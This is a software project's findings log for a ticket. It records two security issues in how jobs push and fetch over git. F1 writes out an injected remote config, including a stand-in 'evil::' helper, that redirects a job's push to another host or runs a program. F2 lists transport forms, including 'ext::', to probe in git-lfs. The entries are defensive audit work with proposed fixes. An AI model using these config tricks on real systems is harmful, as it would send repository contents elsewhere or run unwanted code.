# AR0393 - Findings

What was discovered while doing this ticket but is not part of it: bugs, risks, gaps, and suggested changes. Workers add entries on their branch; the coordinator adds the non-blocking notes from reviews. One entry per finding, numbered, never deleted: only its Status changes.

A finding ends in one of three statuses: `fixed` (the branch fixed it; name the commit), `ticket K0000` (a planning ticket carries it), or `dropped (reason)`. `open` lives only until the merge: `h merge` turns every `Status: open` entry into a planning ticket and rewrites its status to `ticket K0000`.

`- Budget:` is optional: set it, in USD, only when the ticket this finding becomes is expected to cost more than the autopilot default, and leave the line out otherwise. `h merge` copies it into the ticket's JSON block as `budget`, which `h ticket status --autopilot` passes to `--budget`, capped at `H_AUTOPILOT_BUDGET_MAX`.

## F1. A remote named as a machine's URL sends a job's push and fetch to another repository

- Kind: security
- Found by: 2026-10-25-ar0393-remote-url-transp-1c8e5d95 (worker), 2026-10-25
- Where: `packages/core/src/job-machine.ts:111` (`url`), `packages/core/src/job-machine.ts:143` (`gitOver`)
- What: `gitOver` runs `git push <machine.ssh>:<home>/repos/<project>.git` and `git fetch` of the same, and Git reads that word first as the name of a remote. A job can write `[remote "gpu:/home/kacper/arthur-home/repos/acme.git"] url = ssh://elsewhere/x.git` (or `pushurl`) into the checkout's config, which `configRefusal` lets through (`remote.<name>.url`), so the base commit goes to another host and the sweep brings the job's branch back from another repository. Git 2.43 does it: with `[remote "gpu:/x/p.git"] url = evil::x` and `git-remote-evil` on PATH, `git push gpu:/x/p.git HEAD:refs/x` ran `git-remote-evil gpu:/x/p.git x`. AR0393 keeps a program from running there (`GIT_PROTOCOL_FROM_USER=0`); an `ssh` URL still passes.
- Suggestion: `configRefusal` refuses a `remote.<name>.*` key whose name holds `:` (no `git remote add` makes one, as a ref name cannot hold it), or `gitOver` passes a URL no remote can be named; test that the push and the fetch go to the machine's repository with such a remote set.
- Status: ticket AR0398

## F2. `git lfs push origin` reads origin's URL outside Git's transport policy

- Kind: security
- Found by: 2026-10-25-ar0393-remote-url-transp-1c8e5d95 (worker), 2026-10-25
- Where: `packages/github/src/github-git.ts:72`
- What: `github.push` runs `git lfs push origin <ref>` before the push when the branch names `filter=lfs`. `GIT_PROTOCOL_FROM_USER=0` is set for it too, but git-lfs is its own program that resolves origin's URL to an LFS endpoint; whether it honours Git's `protocol.*.allow` policy, and whether some URL form makes it run another program, was not checked (git-lfs is not installed here) [INFERENCE].
- Suggestion: with git-lfs installed, try `git lfs push origin` against origin URLs `<name>::…`, `<name>://…`, `ext::…` and a folder with hooks, and refuse the LFS step for any transport the plain push would refuse.
- Status: ticket AR0399
